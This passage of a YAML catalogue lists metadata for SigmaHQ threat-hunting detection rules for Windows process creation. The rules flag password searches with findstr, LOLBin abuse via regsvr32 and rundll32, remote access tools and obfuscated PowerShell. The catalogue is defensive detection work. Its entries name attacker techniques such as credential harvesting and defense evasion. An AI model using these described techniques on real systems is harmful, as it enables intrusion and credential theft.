  - https://lolbas-project.github.io/lolbas/Binaries/Extexport/
  - https://www.hexacorn.com/blog/2018/04/24/extexport-yet-another-lolbin/
  - https://www.microsoft.com/en-us/security/blog/2020/03/23/latest-astaroth-living-off-the-land-attacks-are-even-more-invisible-but-not-less-observable/
  - https://res.armor.com/resources/threat-intelligence/astaroth-banking-trojan/
  - https://securelist.com/the-tetrade-brazilian-banking-malware/97779/
  - https://www.welivesecurity.com/2020/03/05/guildma-devil-drives-electric/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1a0f6f16-2099-4753-9a02-43b6ac7a1fa5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_findstr_password_recon.yml
  name: Potential Password Reconnaissance Via Findstr.EXE
  description: Detects command line usage of "findstr" to search for the "passwords"
    keyword in a variety of different languages
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1552.001
  tags:
  - attack.credential-access
  - attack.t1552.001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://steflan-security.com/windows-privilege-escalation-credential-harvesting/
  - https://adsecurity.org/?p=2288
  false_positives:
  - Unknown
  notes: ''
- detection_id: c2b478fc-09bf-40b2-8768-ab3ec8d61c9a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_iexpress_execution.yml
  name: New Self Extracting Package Created Via IExpress.EXE
  description: 'Detects the "iexpress.exe" utility creating self-extracting packages.

    Attackers where seen leveraging "iexpress" to compile packages on the fly via
    ".sed" files.

    Investigate the command line options provided to "iexpress" and in case of a ".sed"
    file, check the contents and legitimacy of it.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  - detection.threat-hunting
  time_window: ''
  references:
  - https://strontic.github.io/xcyclopedia/library/iexpress.exe-D594B2A33EFAFD0EABF09E3FDC05FCEA.html
  - https://en.wikipedia.org/wiki/IExpress
  - https://decoded.avast.io/janvojtesek/raspberry-robins-roshtyak-a-little-lesson-in-trickery/
  - https://www.virustotal.com/gui/file/602f4ae507fa8de57ada079adff25a6c2a899bd25cd092d0af7e62cdb619c93c/behavior
  false_positives:
  - Administrators building packages using iexpress.exe
  notes: ''
- detection_id: 419dbf2b-8a9b-4bea-bf99-7544b050ec8d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_microsoft_workflow_compiler_execution.yml
  name: Microsoft Workflow Compiler Execution
  description: 'Detects the execution of Microsoft Workflow Compiler, which may permit
    the execution of arbitrary unsigned code.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1127
  - T1218
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1127
  - attack.t1218
  - detection.threat-hunting
  time_window: ''
  references:
  - https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md
  - https://lolbas-project.github.io/lolbas/Binaries/Microsoft.Workflow.Compiler/
  false_positives:
  - Legitimate MWC use (unlikely in modern enterprise environments)
  notes: ''
- detection_id: d48c5ffa-3b02-4c0f-9a9e-3c275650dd0e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_mode_codepage_change.yml
  name: CodePage Modification Via MODE.COM
  description: 'Detects a CodePage modification using the "mode.com" utility.

    This behavior has been used by threat actors behind Dharma ransomware.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  - detection.threat-hunting
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/win32/intl/code-page-identifiers
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mode
  - https://strontic.github.io/xcyclopedia/library/mode.com-59D1ED51ACB8C3D50F1306FD75F20E99.html
  - https://www.virustotal.com/gui/file/5e75ef02517afd6e8ba6462b19217dc4a5a574abb33d10eb0f2bab49d8d48c22/behavior
  false_positives:
  - Unknown
  notes: ''
- detection_id: 183e7ea8-ac4b-4c23-9aec-b3dac4e401ac
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_net_execution.yml
  name: Net.EXE Execution
  description: Detects execution of "Net.EXE".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1007
  - T1018
  - T1021.002
  - T1049
  - T1069.001
  - T1069.002
  - T1087.001
  - T1087.002
  - T1135
  - T1201
  tags:
  - attack.discovery
  - attack.t1007
  - attack.t1049
  - attack.t1018
  - attack.t1135
  - attack.t1201
  - attack.t1069.001
  - attack.t1069.002
  - attack.t1087.001
  - attack.t1087.002
  - attack.lateral-movement
  - attack.t1021.002
  - attack.s0039
  - detection.threat-hunting
  time_window: ''
  references:
  - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
  - https://eqllib.readthedocs.io/en/latest/analytics/4d2e7fc1-af0b-4915-89aa-03d25ba7805e.html
  - https://eqllib.readthedocs.io/en/latest/analytics/e61f557c-a9d0-4c25-ab5b-bbc46bb24deb.html
  - https://eqllib.readthedocs.io/en/latest/analytics/9b3dd402-891c-4c4d-a662-28947168ce61.html
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1007/T1007.md#atomic-test-2---system-service-discovery---netexe
  false_positives:
  - Likely
  notes: ''
- detection_id: 2238d337-42fb-4971-9a68-63570f2aede4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_net_quic.yml
  name: SMB over QUIC Via Net.EXE
  description: Detects the mounting of Windows SMB shares over QUIC, which can be
    an unexpected event in some enterprise environments.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1570
  tags:
  - attack.lateral-movement
  - attack.t1570
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/74438b0237d141ee9c99747976447dc884cb1a39/atomics/T1570/T1570.md
  - https://www.trustedsec.com/blog/making-smb-accessible-with-ntlmquic/
  false_positives:
  - Administrative activity
  notes: ''
- detection_id: 9bdaf1e9-fdef-443b-8081-4341b74a7e28
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_office_svchost_parent.yml
  name: Suspicious New Instance Of An Office COM Object
  description: 'Detects an svchost process spawning an instance of an office application.
    This happens when the initial word application creates an instance of one of the
    Office COM objects such as ''Word.Application'', ''Excel.Application'', etc.

    This can be used by malicious actors to create malicious Office documents with
    macros on the fly. (See vba2clr project in the references)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - attack.defense-evasion
  - detection.threat-hunting
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/office/troubleshoot/office-developer/automate-word-create-file-using-visual-basic
  - https://github.com/med0x2e/vba2clr
  false_positives:
  - Legitimate usage of office automation via scripting
  notes: ''
- detection_id: d0d28567-4b9a-45e2-8bbc-fb1b66a1f7f6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_powershell_abnormal_commandline_size.yml
  name: Unusually Long PowerShell CommandLine
  description: Detects unusually long PowerShell command lines with a length of 1000
    characters or more
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse
  false_positives:
  - Unknown
  notes: ''
- detection_id: ad856965-f44d-42a8-945e-bbf7bd03d05a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_powershell_crypto_namespace.yml
  name: Invocation Of Crypto-Classes From The "Cryptography" PowerShell Namespace
  description: 'Detects the invocation of PowerShell commands with references to classes
    from the "System.Security.Cryptography" namespace.

    The PowerShell namespace "System.Security.Cryptography" provides classes for on-the-fly
    encryption and decryption.

    These can be used for example in decrypting malicious payload for defense evasion.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027.010
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1059.001
  - attack.t1027.010
  - detection.threat-hunting
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography?view=net-8.0
  - https://blogs.vmware.com/security/2023/11/jupyter-rising-an-update-on-jupyter-infostealer.html
  - https://www.virustotal.com/gui/file/39102fb7bb6a74a9c8cb6d46419f9015b381199ea8524c1376672b30fffd69d2
  false_positives:
  - Classes are legitimately used, but less so when e.g. parents with low prevalence
    or decryption of content in temporary folders.
  notes: ''
- detection_id: 4ad74d01-f48c-42d0-b88c-b31efa4d2262
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_powershell_import_module.yml
  name: Import New Module Via PowerShell CommandLine
  description: Detects usage of the "Import-Module" cmdlet in order to add new Cmdlets
    to the current PowerShell session
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.threat-hunting
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-module?view=powershell-7.3
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-module?view=powershell-5.1
  false_positives:
  - Depending on the environement, many legitimate scripts will import modules inline.
    This rule is targeted for hunting purposes.
  notes: ''
- detection_id: 51483085-0cba-46a8-837e-4416496d6971
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_powershell_new_netfirewallrule_allow.yml
  name: New Windows Firewall Rule Added Via New-NetFirewallRule Cmdlet
  description: 'Detects calls to the "New-NetFirewallRule" cmdlet from PowerShell
    in order to add a new firewall rule with an "Allow" action.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md#atomic-test-24---set-a-firewall-rule-using-new-netfirewallrule
  - https://malware.news/t/the-rhysida-ransomware-activity-analysis-and-ties-to-vice-society/72170
  - https://cybersecuritynews.com/rhysida-ransomware-attacking-windows/
  false_positives:
  - Administrator script
  notes: ''
- detection_id: e4b6d2a7-d8a4-4f19-acbd-943c16d90647
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_powershell_susp_child_processes.yml
  name: Potentially Suspicious PowerShell Child Processes
  description: 'Detects potentially suspicious child processes spawned by PowerShell.

    Use this rule to hunt for potential anomalies initiating from PowerShell scripts
    and commands.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://twitter.com/ankit_anubhav/status/1518835408502620162
  false_positives:
  - False positives are to be expected from PowerShell scripts that might make use
    of additional binaries such as "mshta", "bitsadmin", etc. Apply additional filters
    for those scripts.
  notes: ''
- detection_id: ce2c44b5-a6ac-412a-afba-9e89326fa972
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_regsvr32_dllregisterserver_exec.yml
  name: Regsvr32.EXE Calling of DllRegisterServer Export Function Implicitly
  description: 'Detects execution of regsvr32 with the silent flag and no other flags
    on a DLL located in an uncommon or potentially suspicious location.

    When Regsvr32 is called in such a way, it implicitly calls the DLL export function
    ''DllRegisterServer''.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  - detection.threat-hunting
  time_window: ''
  references:
  - https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/
  - https://www.virustotal.com/gui/file/288fc4f954f98d724e6fab32a89477943df5c0e9662cb199a19b90ae0c63aebe/detection
  - https://learn.microsoft.com/en-us/windows/win32/api/olectl/nf-olectl-dllregisterserver
  - https://ss64.com/nt/regsvr32.html
  false_positives:
  - Legitimate usage as part of application installation, but less likely from e.g.
    temporary paths.
  notes: ''
- detection_id: aa3168fb-d594-4f93-a92d-7a9ba675b766
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_remote_access_tools_action1_code_exec_and_remote_sessions.yml
  name: Remote Access Tool - Action1 Arbitrary Code Execution and Remote Sessions
  description: 'Detects the execution of Action1 in order to execute arbitrary code
    or establish a remote session.


    Action1 is a powerful Remote Monitoring and Management tool that enables users
    to execute commands, scripts, and binaries.

    Through the web interface of action1, the administrator must create a new policy
    or an app to establish remote execution and then points that the agent is installed.


    Hunting Opportunity 1- Weed Out The Noise


    When threat actors execute a script, a command, or a binary through these new
    policies and apps, the names of these become visible in the command line during
    the execution process. Below is an example of the command line that contains the
    deployment of a binary through  a policy with name "test_app_1":


    ParentCommandLine: "C:\WINDOWS\Action1\action1_agent.exe schedule:Deploy_App__test_app_1_1681327673425
    runaction:0"


    After establishing a baseline, we can split the command to extract the policy
    name and group all the policy names and inspect the results with a list of frequency
    occurrences.


    Hunting Opportunity 2 - Remote Sessions On Out Of Office Hours


    If you have admins within your environment using remote sessions to administer
    endpoints, you can create a threat-hunting query and modify the time of the initiated
    sessions looking for abnormal activity.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 13
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - baseline_or_anomaly_framing
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  - detection.threat-hunting
  time_window: ''
  references:
  - https://twitter.com/Kostastsale/status/1646256901506605063?s=20
  - https://www.action1.com/documentation/
  false_positives:
  - If Action1 is among the approved software in your environment, you might find
    that this is a noisy query. See description for ideas on how to alter this query
    and start looking for suspicious activities.
  notes: ''
- detection_id: 7da7809e-f3d5-47a3-9d5d-fc9d019caf14
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_remote_access_tools_ammyy_admin_execution.yml
  name: Remote Access Tool - Ammy Admin Agent Execution
  description: Detects the execution of the Ammy Admin RMM agent for remote management.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques: []
  tags:
  - attack.execution
  - attack.persistence
  - detection.threat-hunting
  time_window: ''
  references:
  - https://www.ammyy.com/en/admin_features.html
  false_positives:
  - Legitimate use of Ammy Admin RMM agent for remote management by admins.
  notes: ''
- detection_id: bc533330-fc29-44c0-b245-7dc6e5939c87
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_remote_access_tools_anyviewer_shell_exec.yml
  name: Remote Access Tool - Cmd.EXE Execution via AnyViewer
  description: 'Detects execution of "cmd.exe" via the AnyViewer RMM agent on a remote
    management sessions.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques: []
  tags:
  - attack.execution
  - attack.persistence
  - detection.threat-hunting
  time_window: ''
  references:
  - https://www.anyviewer.com/help/remote-technical-support.html
  false_positives:
  - Legitimate use for admin activity.
  notes: ''
- detection_id: d1a401ab-8c47-4e86-a7d8-2460b6a53e4a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_remote_access_tools_screenconnect_child_proc.yml
  name: Remote Access Tool - ScreenConnect Remote Command Execution - Hunting
  description: 'Detects remote binary or command execution via the ScreenConnect Service.

    Use this rule in order to hunt for potentially anomalous executions originating
    from ScreenConnect

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.threat-hunting
  time_window: ''
  references:
  - https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708
  false_positives:
  - Legitimate commands launched from ScreenConnect will also trigger this rule. Look
    for anomalies.
  notes: ''
- detection_id: e79a9e79-eb72-4e78-a628-0e7e8f59e89c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_rundll32_by_ordinal.yml
  name: DLL Call by Ordinal Via Rundll32.EXE
  description: Detects calls of DLLs exports by ordinal numbers via rundll32.dll.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  - detection.threat-hunting
  time_window: ''
  references:
  - https://web.archive.org/web/20200530031906/https://techtalk.pcmatic.com/2017/11/30/running-dll-files-malware-analysis/
  - https://github.com/Neo23x0/DLLRunner
  - https://twitter.com/cyb3rops/status/1186631731543236608
  - https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine/
  false_positives:
  - False positives depend on scripts and administrative tools used in the monitored
    environment.
  - Windows control panel elements have been identified as source (mmc).
  notes: ''
- detection_id: d81a9fc6-55db-4461-b962-0e78fea5b0ad
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_rundll32_dllregisterserver.yml
  name: Rundll32.EXE Calling DllRegisterServer Export Function Explicitly
  description: 'Detects when the DLL export function ''DllRegisterServer'' is called
    in the commandline by Rundll32 explicitly where the DLL is located in a non-standard
    path.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  - detection.threat-hunting
  time_window: ''
  references:
  - https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/
  - https://www.virustotal.com/gui/file/94816439312563db982cd038cf77cbc5ef4c7003e3edee86e2b0f99e675ed4ed/behavior
  - https://learn.microsoft.com/en-us/windows/win32/api/olectl/nf-olectl-dllregisterserver
  false_positives:
  - Legitimate usage as part of application installation, but less likely from e.g.
    temporary paths.
  - Not every instance is considered malicious, but this rule will capture the malicious
    usages.
  notes: ''
- detection_id: 57712d7a-679c-4a41-a913-87e7175ae429
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_sc_query.yml
  name: SC.EXE Query Execution
  description: Detects execution of "sc.exe" to query information about registered
    services on the system
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1007
  tags:
  - attack.discovery
  - attack.t1007
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1007/T1007.md#atomic-test-1---system-service-discovery
  false_positives:
  - Legitimate query of a service by an administrator to get more information such
    as the state or PID
  - Keybase process "kbfsdokan.exe" query the dokan1 service with the following commandline
    "sc query dokan1"
  notes: ''
- detection_id: 9494479d-d994-40bf-a8b1-eea890237021
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_schtasks_creation_from_susp_parent.yml
  name: Scheduled Task Creation From Potential Suspicious Parent Location
  description: 'Detects the execution of "schtasks.exe" from a parent that is located
    in a potentially suspicious location.

    Multiple malware strains were seen exhibiting a similar behavior in order to achieve
    persistence.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.execution
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1053.005
  - detection.threat-hunting
  time_window: ''
  references:
  - https://app.any.run/tasks/649e7b46-9bec-4d05-98a5-dfa9a13eaae5/
  false_positives:
  - Software installers that run from temporary folders and also install scheduled
    tasks
  notes: ''
- detection_id: e0552b19-5a83-4222-b141-b36184bb8d79
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_susp_cli_obfuscation_unicode.yml
  name: Potential CommandLine Obfuscation Using Unicode Characters
  description: 'Detects potential CommandLine obfuscation using unicode characters.

    Adversaries may attempt to make an executable or file difficult to discover or
    analyze by encrypting, encoding, or otherwise obfuscating its contents on the
    system or in transit.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027
  tags:
  - attack.defense-evasion
  - attack.t1027
  - detection.threat-hunting
  time_window: ''
  references:
  - https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1027/T1027.md#atomic-test-6---dlp-evasion-via-sensitive-data-in-vba-macro-over-http
  false_positives:
  - Unknown
  notes: ''
- detection_id: 27a72a60-7e5e-47b1-9d17-909c9abafdcd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_susp_compression_params.yml
  name: Potentially Suspicious Compression Tool Parameters
  description: Detects potentially suspicious command line arguments of common data
    compression tools
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1560.001
  tags:
  - attack.collection
  - attack.t1560.001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://twitter.com/SBousseaden/status/1184067445612535811
  false_positives:
  - Unknown
  notes: ''
- detection_id: 61065c72-5d7d-44ef-bf41-6a36684b545f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_susp_elevated_system_shell.yml
  name: Elevated System Shell Spawned
  description: 'Detects when a shell program such as the Windows command prompt or
    PowerShell is launched with system privileges. Use this rule to hunt for potential
    suspicious processes.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.execution
  - attack.t1059
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/Wh04m1001/SysmonEoP
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9cd55b6c-430a-4fa9-96f4-7cadf5229e9f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_susp_event_log_query.yml
  name: EventLog Query Requests By Builtin Utilities
  description: 'Detect attempts to query the contents of the event log using command
    line utilities. Attackers use this technique in order to look for sensitive information
    in the logs such as passwords, usernames, IPs, etc.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1552
  tags:
  - attack.t1552
  - attack.credential-access
  - detection.threat-hunting
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.3
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-eventlog?view=powershell-5.1
  - http://www.solomonson.com/posts/2010-07-09-reading-eventviewer-command-line/
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil
  false_positives:
  - Legitimate log access by administrators or troubleshooting tools
  notes: ''
- detection_id: 90b63c33-2b97-4631-a011-ceb0f47b77c3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_susp_execution_from_guid_folder_names.yml
  name: Potential Suspicious Execution From GUID Like Folder Names
  description: 'Detects potential suspicious execution of a GUID like folder name
    located in a suspicious location such as %TEMP% as seen being used in IcedID attacks.

    Use this rule to hunt for potentially suspicious activity stemming from uncommon
    folders.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027
  tags:
  - attack.defense-evasion
  - attack.t1027
  - detection.threat-hunting
  time_window: ''
  references:
  - https://twitter.com/Kostastsale/status/1565257924204986369
  false_positives:
  - Installers are sometimes known for creating temporary folders with GUID like names.
    Add appropriate filters accordingly
  notes: ''
- detection_id: 35efb964-e6a5-47ad-bbcd-19661854018d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_susp_execution_path_webserver.yml
  name: Execution From Webserver Root Folder
  description: 'Detects a program executing from a web server root folder. Use this
    rule to hunt for potential interesting activity such as webshell or backdoors

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
